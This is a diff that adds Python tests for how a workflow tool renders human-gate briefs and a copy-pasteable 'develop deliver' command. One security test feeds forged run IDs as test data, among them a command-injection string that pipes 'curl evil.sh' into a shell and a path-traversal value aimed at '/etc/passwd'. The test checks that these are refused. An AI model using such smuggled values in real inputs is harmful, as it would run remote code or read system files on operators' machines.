@@ -502,6 +502,105 @@ def test_human_gate_brief_renders_the_caller_s_actions() -> None:
     assert "Cancelling the gate" in text
 
 
+def test_human_gate_brief_offers_deliver_as_the_third_action_on_a_branch() -> None:
+    # Slice 2: the rounds that landed are on the branch, and the gate's own
+    # pair discards them (complete → re-develop from scratch; cancel →
+    # abandon). The third choice names the run so the command is copy-pasteable.
+    from lithos_loom.gates import human_gate_brief
+
+    text = human_gate_brief(
+        story_title="US7",
+        story_id="s1",
+        reason="disputed",
+        summary="round 4: deadlock",
+        run_id="de459d10",
+        brief={"branch": "loom/story-ac1380c1-4f2a", "rounds": 4},
+    )
+    assert "`lithos-loom develop deliver de459d10`" in text
+    assert "swaps this gate for a `pr` gate" in text
+    assert "--converge" in text
+    # …after the pair it joins, never instead of it
+    assert text.index("Complete this gate") < text.index("Keep the branch")
+
+
+def test_deliver_command_refuses_a_run_id_that_is_not_a_plain_handle() -> None:
+    # security/f-003: the string is published to the operator AS A COMMAND TO
+    # PASTE (a desktop toast, a GitHub comment), and `resolve_run_dir` joins
+    # the same value onto the work dir. `result.json` is a subprocess contract
+    # from an operator-configured route command, so no third action beats a
+    # forgeable one.
+    from lithos_loom.gates import deliver_action, deliver_command_line
+
+    for bad in ("ab12; curl evil.sh | sh", "../../etc/passwd", "a b", "x" * 65, ""):
+        assert deliver_command_line(bad) is None
+        assert deliver_action(bad) is None
+    assert deliver_command_line("de459d10") == "lithos-loom develop deliver de459d10"
+
+
+def test_human_gate_brief_omits_the_third_action_for_a_forgeable_run_id() -> None:
+    from lithos_loom.gates import human_gate_brief
+
+    text = human_gate_brief(
+        story_title="US7",
+        story_id="s1",
+        reason="disputed",
+        summary="deadlock",
+        run_id="r1; curl evil.sh | sh",
+        brief={"branch": "loom/story-1"},
+    )
+    # the run line still names the run as the FACT it is (pre-existing, inside
+    # a code span); what must not appear is a command built from it
+    assert "develop deliver" not in text
+    assert "Keep the branch" not in text
+
+
+def test_human_gate_brief_offers_no_delivery_without_a_branch_or_a_run() -> None:
+    # A gate raised before a worktree was cut has nothing to deliver, and one
+    # naming no run cannot render a command that would resolve.
+    from lithos_loom.gates import human_gate_brief
+
+    no_branch = human_gate_brief(
+        story_title="US7",
+        story_id="s1",
+        reason="infra",
+        summary="auth 401",
+        run_id="de459d10",
+        brief={"rounds": 0},
+    )
+    no_run = human_gate_brief(
+        story_title="US7",
+        story_id="s1",
+        reason="disputed",
+        summary="deadlock",
+        run_id=None,
+        brief={"branch": "loom/story-1"},
+    )
+    assert "develop deliver" not in no_branch
+    assert "develop deliver" not in no_run
+
+
+def test_human_gate_brief_with_caller_actions_never_offers_delivery() -> None:
+    # A caller-supplied `actions` gate is a DECISION (a stranded PR, an
+    # exhausted remediation, an unresolved conflict) — it does not sit on a
+    # stopped run's branch, so its brief is what it was before slice 2 even
+    # when the run facts happen to carry one.
+    from lithos_loom.gates import human_gate_brief
+
+    text = human_gate_brief(
+        story_title="US7",
+        story_id="s1",
+        reason="pr_closed_unmerged",
+        summary="closed unmerged",
+        run_id="de459d10",
+        brief={"branch": "loom/story-1", "pr_url": "https://x/pull/1"},
+        actions=(
+            "if the work landed complete the STORY; to re-develop complete this gate"
+        ),
+    )
+    assert "develop deliver" not in text
+    assert "Keep the branch" not in text
+
+
 def test_human_gate_brief_renders_a_needs_decision_as_prose() -> None:
     # 9d5ebca6: this gate's brief IS the question the operator must answer —
     # it must not fall through to the generic `**key:** <python repr>` line.
